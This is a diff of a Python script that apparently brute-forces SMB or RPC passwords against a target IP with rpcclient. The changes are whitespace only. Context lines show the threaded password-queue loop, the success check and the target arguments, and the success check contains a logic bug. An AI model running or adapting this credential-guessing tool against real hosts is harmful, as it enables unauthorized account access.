@@ -25,11 +25,11 @@ class workerthread(threading.Thread):
 				if ("DENIED" or "TIMEOUT") not in out.stdout:
 					print("Success! user:{} pass:{}".format(self.user, pwd))
 					sys.exit()
-				
+
 				if ("TIMEOUT") in out.stdout:
 					print("connection issues. exiting.")
 					sys.exit()
-      
+
         		# print the queue size using qsize as queue len gets reduced on every queue.get()
 			  	print("{}/{} - {} failed.".format(self.q.qsize(), self.lc, pwd))
 
@@ -47,7 +47,6 @@ def build_pwd_queue(pwdfile):
 			linecount += 1
 	return pwdq, linecount
 
-	
 if __name__ == "__main__":
 
 	p = argparse.ArgumentParser("Brute force w/ rpcclient")
@@ -56,7 +55,7 @@ if __name__ == "__main__":
 	p.add_argument("rhost", help="ip address of target")
 	p.add_argument("-t", help="max threads", dest="maxthread", type=int, default=10)
 	r = p.parse_args()
-	
+
 	start = time.time()
 
 	pwdq, lc = build_pwd_queue(r.pwdfile) # pass queue object to a variable, this queue object has been filled with passwords
